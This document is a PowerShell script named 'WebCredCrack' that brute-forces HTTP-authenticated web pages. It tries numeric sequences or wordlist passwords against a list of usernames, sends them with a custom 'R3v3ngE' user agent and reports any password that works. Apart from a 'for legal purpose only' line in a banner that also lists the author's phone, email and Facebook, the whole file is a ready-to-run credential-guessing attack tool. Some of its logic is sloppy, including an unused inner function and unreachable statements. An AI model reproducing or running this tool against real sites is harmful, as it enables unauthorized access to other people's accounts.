[console]::Title = "WebCredCrack"
[console]::ForegroundColor = 'white'
"            ____ ____  
   []  []  []  __| {}_)
    [][][][]|  __| {} )
     []  [] |____|___/ credential password attack 
    ==============================================
    ============== by N47n@31 Wub3t ==============
    ============ phone: +251941226507 ============
    ========= email: natyw4122@gmail.com =========
    ============ facebook: naty.wubet ============
    ==============================================
    =========== for legal purpose only ===========
    ==============================================
    
    "
[console]::ForegroundColor = 'green'
function web
{
    function w-login
    {
                    $usr = $user 
            $p = $i 
            $url = $uri
        $web = New-Object System.Net.WebClient
        $web.UserAgent = "R3v3ngE"
        write-host "trying by $p to $u for $url"
        $pass = ConvertTo-SecureString -AsPlainText -String $p -Force
        $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $usr, $pass
        $web.Credentials = $cred
        
    }
    $uri = Read-Host -Prompt "URL"
    $user = Read-Host -Prompt "Userlist"
    $list = Read-Host -Prompt "password list ('1' for numberic attack)"
    if ($list -eq 1)
    {
        foreach ($usr in $user)
        {
            $s=0;$i=0
            while ($s -lt 3)
            {
                #$usr = $user 
                $p = $i 
                $url = $uri
                $web = New-Object System.Net.WebClient
                write-host "trying by $p to $usr for $url"
                $pass = ConvertTo-SecureString -AsPlainText -String $p -Force
                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $usr, $pass
                $web.Credentials = $cred
                $web.UserAgent = "R3v3ngE"
                try
                {
                    $web.DownloadString($url) |Out-Null
                   $o = 0
                } catch {
                   $o = 1
                }
                if ($o -eq 0)
                {
                    Write-Host "done: the password is $i" -ForegroundColor Green
                    ""
                    break;
                    $s=6
                } else {
                    Write-Host "failed" -ForegroundColor DarkGreen
                }
                $i++
            }
        }
    } else {
        foreach ($usr in (cat $user))
        {
            foreach ($tmp in (gc $list))
            {
                #$usr = $user 
                $p = $tmp 
                $url = $uri
                $web = New-Object System.Net.WebClient
                write-host "trying by $p to $usr for $url" -NoNewline
                $pass = ConvertTo-SecureString -AsPlainText -String $p -Force
                
                
                $web.UserAgent
                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $usr, $pass
                $web.Credentials = $cred
                try
                {
                   $web.DownloadString($url) |Out-Null
                   $o = 0
                } catch {
                   $o = 1
                }
                if ($o -eq 0)
                {
                    Write-Host "done: the password is $tmp" -ForegroundColor Magenta
                    pause;
                    $s=6
                } else {
                    Write-Host "failed by $tmp" -ForegroundColor DarkGreen
                }
            }
        }
    }
}
while ($true)
{
    web
}
